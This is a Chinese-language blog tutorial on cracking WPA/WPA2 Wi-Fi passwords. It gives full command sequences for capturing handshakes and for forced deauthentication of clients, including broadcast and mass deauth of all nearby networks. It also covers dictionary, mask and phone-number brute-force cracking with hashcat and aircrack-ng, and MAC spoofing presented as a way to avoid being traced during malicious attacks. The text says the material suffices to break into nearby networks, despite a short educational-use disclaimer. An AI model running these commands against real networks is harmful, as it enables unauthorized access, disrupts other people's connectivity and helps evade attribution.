---
title: "Wi-Fi 等无线网络安全审计方法"
date: 2020-01-24 17:49:59
tags: ["Wi-Fi", "安全", "破解"]
categories: ["安全"]
---

# Wi-Fi 破解

利用 Airodump-ng 以及 [Aircrack-ng](http://aircrack-ng.org/) / [Hashcat](http://hashcat.net/) 破解 WPA/WPA2 WI-FI 路由器。

这是个简洁的教程，一步一步的描述了如何破解使用弱密码保护的 WI-FI 网络。它不会极尽其详，但是足够你用来测试自己的网络安全或者入侵附近网络。下面列出的攻击完全是被动式的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。不过一个可选的 deauthentication 攻击可以用于加速侦查过程，在[文档末尾](#deauth-attack)有描述。

如果你熟悉这个过程，你可以跳过这段描述直接跳到[底部](#命令列表)使用的命令列表。更多种建议以及可行的方法，参考[附录 A](#附录A)。

**声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。**

## 入门

这个教程假定你：

- 可以流畅使用命令行
- 使用一个基于 debian 的 linux 发行版本，最好是 [Kali linux](https://www.kali.org/)
- 安装 [Aircrack-ng](http://aircrack-ng.org/)
  - `sudo apt-get install aircrack-ng`
- 拥有一块支持[监测模式](https://en.wikipedia.org/wiki/Monitor_mode)的无线网卡（对于支持的设备列表，参考[这里](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html))

## 破解一个 WI-FI 网络

### 监测模式 (Monitor Mode)

让我们通过下面的命令可以列出支持监测模式的无线接口开始：

```bash
airmon-ng
```

如果你没有看到有接口列出，意味着你的无线网卡就不支持监测模式 😞

我们将假设你的无线接口名称是 `wlan0`，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监测模式：

```bash
airmon-ng start wlan0
```

运行 `iwconfig`。你现在应该能够看到列出一个新的监测模式接口（比如 `mon0` 或者 `wlan0mon`）。

### 找到你的目标

使用你的监测接口开始监听附近的 [802.11 Beacon 帧](https://en.wikipedia.org/wiki/Beacon_frame)广播：

```bash
airodump-ng mon0
```

你应该可以看到类似于下面的输出。

```
CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests
 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8
 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>
 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro
 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme
 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin's Awesome
 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2
 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2
 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT
 BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root
 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca
```

出于这个演示的目的，我们将会破解我自己的网络，"hackme"。记住利用 `airodump-ng` 展示的 BSSID， MAC 地址以及信道（`CH`）号，在下一个步骤中我们将会需要它们。

### 捕获 4-way Handshake

WPA/WPA2 使用 [4-way Handshake](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk) 来认证设备连接网络。你不需要明白这些的含意，但是你必须抓取 handshake 才能破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及 bssid 值来使用 `airmon-ng` 来监视目标网络。

```bash
# 将 -c 以及 --bssid 值替换为你的目标网络值
# -w 用来指定我们保存捕获到数据包的文件夹
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
```

```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS
```

现在让我们等一会儿... 当我们捕捉到一个握手时，你应该能够马上在屏幕的右上角看到类似于`[ WPA handshake: bc:d3:c9:ef:d2:67`的一些东西。

如果你不想等，也不反感进行一次主动攻击，你可以强制设备连接到目标网络来重新连接，并且在目标网络中发送恶意 deauthentication 数据包。通常这样就可以抓到 4-way handshake 了。参考下面的 [deauth 攻击章节](#deauth-attack) 来获取关于此的信息。

一旦你捕获了一个握手，按下 `ctrl-c` 来终止 `airodump-ng`。这是在你指定的 `airodump-ng` 输出目录下，应该看到一个用来保存捕获信息的`.cap`文件（比如叫做`-01.cap`）。我们将会使用这个捕获文件来破解网络密码。个人喜欢将这个文件重命名为当前正在尝试破解的网络名称：

```bash
mv ./-01.cap hackme.cap
```

### 破解网络密码

最后一个步骤是使用捕获的 handshake 数据来破解密码。如果你能够访问 GPU，我**强烈**建议你使用 `hashcat` 来破解密码。我已经创建了一个叫做 [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat) 的简单工具可以让使用 hashcat 变得非常方便。如果你不能够访问 GPU，还有很多在线的 GPU 破解服务可以使用，比如 [GPUHASH.me](https://gpuhash.me/) 或者 [OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php) 。你也可以常使用 Aircrack-ng 来进行 CPU 破解。

注意下面的攻击方法都假设用户正在使用弱密码。现如今很多 WPA/WPA2 路由自带 12 位强随机密码，大部分用户都不会去更改。如果你去尝试破解这些密码，我建议你使用 [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) 字典文件。

#### 使用 `naive-hashcat` 破解（推荐）

在我们使用 naive-hashcat 破解密码之前，我们需要将我们的 `.cap` 文件转换成同等 hashcat 文件格式 `.hccapx`。你可以通过上传 `.cap` 文件到 <https://hashcat.net/cap2hccapx/> 或者直接使用 [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) 工具。

```bash
cap2hccapx.bin hackme.cap hackme.hccapx
```

接着，下载并运行 `naive-hashcat`：

```bash
# 下载
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 下载 134MB rockyou 字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 破解！宝贝！破解！
# 2500 是 hashcat 对于 WPA/WPA2 的哈希模式
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Naive-hashcat 使用多种[字典](https://hashcat.net/wiki/doku.php?id=dictionary_attack)，[规则](https://hashcat.net/wiki/doku.php?id=rule_based_attack)，[组合](https://hashcat.net/wiki/doku.php?id=combinator_attack)以及[伪装](https://hashcat.net/wiki/doku.php?id=mask_attack)（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到 hackme.pot，因此不时要检查这个文件。一旦你破解这个密码，你将会在你的 `POI_FILE` 看到类似于下面的内容：

```
e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
```

最后两块被 `:` 分隔开来，分别是网络名称和密码。

如果你想直接使用 `hashcat` 而不是 `naive-hashcat` 的话请参考[这个页面](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)。

#### 利用 Aircrack-ng 破解

Aircrack-ng 可以用于在你的 CPU 上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的 rockyou 字典文件：

```bash
# 下载 134MB rockyou 字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

注意，如果网络密码不再这个单词文件话，你将不能破解密码。

```bash
# -a2 指定 WPA2，-b 是 BSSID，-w 是字典文件
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
```

如果密码被破解了，你将会在终端看到一个 `KEY FOUND!` 消息，后面跟着的文本就是网络密码。

```
                                 Aircrack-ng 1.2 beta3


                   [00:01:49] 111040 keys tested (1017.96 k/s)


                         KEY FOUND! [ hacktheplanet ]


      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89
                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E

      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71
                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73
                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78
                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21

      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4
```

## Deauth Attack

Deauth 攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的 “发件人” 地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用`airodump-ng`进行侦听，就能捕获到 4-way handshake。

使用 `airodump-ng` 监视特定接入点（使用 `-c channel --bssid MAC`），直到看到客户端（`STATION`）连接。 连接的客户端看起来像这样，`64：BC：0C：48：97：F7` 是客户端 MAC。

```
 CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
```

现在，先不管这个正在运行的 `airodump-ng` ，打开一个新的终端。 我们用 `aireplay-ng` 命令向我们的受害者客户端发送伪造的解除认证数据包，强制其重新连接到网络，以便在此过程中抓取 handshake。

```bash
# -0 2 指定了我们将发送 2 个解除认证的数据包。如果需要
# 可以增加这个数字，但随之而来客户端网络可能中断，有被人注意到的风险。
# -a 是接入点的 MAC
# -c 是客户端的 MAC
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```

你也可以选择得通过广播解除认证数据包到所有连接的客户端：

```bash
# 尽管不是所有的客户端都会响应广播解除认证
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```

发送了解除认证数据包后，回到你的 `airodump-ng` 进程，运气好的话你现在应该看到右上角：`[WPA握手：9C：5C：8E：C9：AB：C0`。 现在你已经捕获了握手，你应该准备好[破解网络密码](#crack-the-network-password)。

## 命令列表

下面列出了破解 WPA/WPA2 网络所需的所有命令，以最少的解释为依据。

```bash
# 将你的设备设置成监测模式
airmon-ng start wlan0

# 监听附近所有的 beacon 帧来获取目标 BSSID 以及信道
airodump-ng mon0

# 开始监听握手
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# 选择性的对于连接的设备进行解除验证从而强制握手
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## 利用 aircrack-ng 破解密码... ##########

# 如果需要的话下载 134MB 的 rockyou.txt 字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 利用 w/ aircrack-ng 破解
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## 或者利用 naive-hashcat 破解密码 ##########

# 将 cap 转换成 hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# 利用 naive-hashcat 破解
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

## 附录

非常欢迎对这篇教程进行回复，我已经添加了社区成员的建议和附加资料作为[附录](#appendix.zh.md)。它包括：

- 在 MacOS/OSX 上捕获握手并且破解 WPA 密码
- 利用 `wlandump-ng` 捕获从你周围每个网络捕获握手
- 使用 `crunch` 即时生成 100+GB 的单词列表
- 利用 `macchanger` 伪造你的 MAC 地址

现在也提供[中文版本](appendix.zh.md)附录。

## 致谢

这里提供的大部分信息都是从 [Lewis Encarnacion 的绝妙的教程](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html) 中收集的。 感谢在 Aircrack-ng 和 Hashcat 上工作的优秀作者和维护者。

非常感谢 [neal1991](https://github.com/neal1991) 将本教程翻译成[中文](README.zh.md)。另外也感谢 [hiteshnayak305](https://github.com/hiteshnayak305)，[enilfodne](https://github.com/enilfodne)， [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore)，[hivie7510](https://www.reddit.com/user/hivie7510)，[cprogrammer1994](https://github.com/cprogrammer1994)，[0XE4](https://github.com/0XE4)，[hartzell](https://github.com/hartzell)，[zeeshanu](https://github.com/zeeshanu)，[flennic](https://github.com/flennic)，[bhusang](https://github.com/bhusang)，[tversteeg](https://github.com/tversteeg)，[gpetrousov](https://github.com/gpetrousov)，[crowchirp](https://github.com/crowchirp) 和 [Shark0der](https://github.com/shark0der)，他们也在 [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) 和 GitHub 上提供建议或帮助完善这篇文章。如果您有兴趣听取 WPA2 的一些建议替代方案，请参考 [Hacker News](https://news.ycombinator.com/item?id=14840539) 的一些重要讨论。

# 附录 A

在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：

- 在 MacOS/OSX 上破解 WI-FI
- 利用 `wlandump-ng` 抓取 handshake
- 利用 `crunch` 生成单词列表
- 利用 `macchanger` 保护你的身份

## 在 MacOS/OSX 上破解 WI-FI

非常感谢 [@harshpatel991](https://github.com/harshpatel991) 提供本指南。下面会介绍如何使用 MacOS/OSX 自带的工具抓取 4-way handshake，然后再通过 naive-hashcat 来找出一个 WPA/WPA2 无线网络的密码。 此方法已在 OSX 10.10 和 10.12 上进行测试，不过也可能适用于其他版本。 像主教程一样，我们假设你有一个支持 [监测模式](https://en.wikipedia.org/wiki/Monitor_mode) 的[无线网卡](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)。我们在 2012 年上半年和 2015 年中期这两款 MacBook Pro 上进行了测试，并取得了巨大的成功。

### 无线诊断工具

幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断...”

### 测定目标网络信道

打开无线诊断程序，单击**窗口** > **扫描**。 找到目标网络，记录下其信道和宽度。

### 抓取一个 4-way handshake

1. 在无线诊断程序打开的情况下，点击菜单栏中的**窗口** > **嗅探器**。选择你在上一步中找到的信道和宽度。
2. 现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。
3. 当你感觉已经成功抓取 handshake 时，点击停止。
4. 根据你的操作系统版本，抓取的 `.wcap` 文件将被保存到桌面或`/var/tmp/`。
5. 将抓取的文件上传到 https://hashcat.net/cap2hccapx/ 就可以将其转换为 `.hccapx` 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个`.hccapx`文件。 否则将不会提示下载。

### 利用 `naive-hashcat` 破解密码

```bash
# 克隆 naive-hashcat
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 在 MacOS/OSX 上从原代码构建程序
./build-hashcat-osx.sh

# 下载 134MB rockyou字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

最后，运行 `naive-hashcat.sh`。将 `handshake.hccapx` 名称改成你从 [hashcat.net](https://hashcat.net/cap2hccapx/) 下载的文件名称。`cracked.pot`是输出文件名称。

```
HASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

再次感谢 [@harshpatel991](https://github.com/harshpatel991)，以及 [phillips321](http://www.phillips321.co.uk/) 关于如何在 OSX 上构建 hashcat 的[帖子](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/)。

## 使用 `wlandump-ng` 抓取 handshake

[@enilfodne](https://github.com/enilfodne) 提到 hachcat 社区有一个[更棒的工具](https://github.com/brannondorsey/wifi-cracking/issues/15)可以抓取 WPA 的 4-way handshakes。它是 hashcat 工具包的一部分，叫 [hcxtools](https://github.com/ZerBea/hcxtools) ，由 [ZerBea](https://github.com/ZerBea) 开发，名声已经超过了 `airdump-ng`。`wlandump-ng` 允许你一次性从每个附近的网络上全面抓取 handshake 信息，跳过 Wi-Fi 信道，以增加收集。

```bash
# 克隆 hcxtools
git clone https://github.com/ZerBea/hcxtools
cd hcxtools

# 构建并且安装
# 你将可能需要apt来安装需要的依赖
# https://github.com/ZerBea/hcxtools#requirements
make
sudo make install

# 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接
# 将wlan0替换成你的无线设备名称
wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20

# 一旦你获得了抓取的文件，你可以利用以下命令将其转换成hashcat抓取格式
cap2hccapx.bin capture.cap capture.hccapx
```

`wlandump-ng` 命令行参数（使用 `h` 标志来获得完整列表）：

- `-c 1`：从通道 1 开始的 2.4Ghz 范围（将转到 13）
- `-t 60`：每个通道停留 60s（实验值较低，默认值为 5）
- `-d 100`：发送 deauth 每 100 个信标帧
- `-D 10`：每隔 10 个信标帧发送解析数据包
- `-m 512`：内部缓冲区大小，对于低资源机器使用 512
- `-b`：激活信号到最后 10 个探测请求
- `-r`：如果循环在通道 1 上，则重置 deauthentication / detachosciation 计数器
- `-s 20`：显示 20 条状态行

**警告：** 在大多数地方使用这个是不合法的。更多信息请参考[这里](https://github.com/ZerBea/hcxtools#warning)。

`wlandump-ng` 也提供了在被动模式下运行的选项，这时不会发送任何 deauth/disassociation 数据帧。 如果担心会影响到周围人使用网络（你应该是）时建议你使用这种模式。代价是你获得的 handshake 会少得多，不过用这种方法抓取不会被人察觉。

```bash
# 在被动模式下使用默认设置运行
wlandump-ng -i wlan0 -o capture.cap -p -s 20
```

## 使用 `crunch` 生成单词列表

`crunch` 是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用 crunch 来即时生成密码列表，再通过管道传递给 `aircrack-ng` 而不必将单词列表保存到磁盘。

```bash
# 安装crunch
sudo apt-get install crunch
```

要想知道如何运行 crunch，可以从命令行运行（一旦开始发送密码，就可以按 `ctrl-c`）：

```bash
# 语法 8 8 是生成密码的最小长度和最大长度
# 01234567890 是组合/排列构成密码的一组字符
crunch 8 8 0123456789
```

```
Crunch 现在将生成以下数据量：900000000字节
858 MB
0 GB
0 TB
0 PB
Crunch 现在将生成以下行数：100000000
00000000
00000001
00000002
00000003
00000004
00000005
00000006
00000007
00000008
00000009
...
99999999
```

我们可以将 `crunch` 的输出作为 `aircrack-ng` 的输入，使用它生成的密码作为我们的单词列表。 这里我们使用 `crunch` 特殊规则字符 `%` 来表示数字。 此命令尝试破解 10 位电话号码的 WPA 密码（使用 crunch 即时生成的 102GB 的号码）：

```bash
# 我们也可以使用 -t "@^%,"  使用模式 '@' 替换小写 ',' － 替换大写
# '%' －替换数字以及 '^' － 替换特殊字符
# *************** 不要忘记最后的 '-'
crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
```

## 利用 `macchanger` 保护你的个人信息

每当您使用 Wi-Fi 进行任何远程恶意攻击时，最好将你 Wi-Fi 设备的 MAC 地址进行伪装，避免被人通过网络流量里的设备信息找到你。

这是利用 `macchanger` 的一个小尝试：

```bash
# 下载 MAC changer
sudo apt-get install macchanger

# 关闭设备
sudo ifconfig wlan0 down

# 改变 mac
# -A 为有效的供应商分配一个随机的MAC w/a
# -r 让它真正随机
# -p 将其恢复到原始的硬件MAC
sudo macchanger -A wlan0

# 启动设备
sudo ifconfig wlan0 up
```

如果你有多张无线网卡，最好把所有的设备都改一遍。 或者当你尝试抓取 handshake 时干脆把不用的设备都关掉，尽可能少地留下痕迹。 请注意，重启后伪装的设备信息会恢复。
